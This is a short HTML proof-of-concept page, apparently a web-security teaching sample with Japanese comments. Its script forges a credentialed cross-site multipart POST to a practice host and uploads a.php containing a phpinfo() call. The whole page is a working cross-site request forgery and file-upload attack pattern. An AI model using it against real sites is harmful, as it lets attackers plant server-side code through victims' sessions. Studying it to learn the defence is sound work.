<body>
<script>
  // 以下は送信するHTTPリクエストボディの中身
  // \n\ は改行(\n) と 継続行(行末の\)を示す
  data = '\
----BNDRY\n\
Content-Disposition: form-data; name="imgfile"; filename="a.php"\n\
Content-Type: text/plain\n\
\n\
<?php phpinfo();\n\
\n\
----BNDRY--\n\
';

  var req = new XMLHttpRequest();
  req.open('POST', 'http://example.jp/45/45-005.php');
  req.setRequestHeader('Content-Type', 'multipart/form-data; boundary=--BNDRY');
  req.withCredentials = true;
  req.send(data);
</script>
</body>

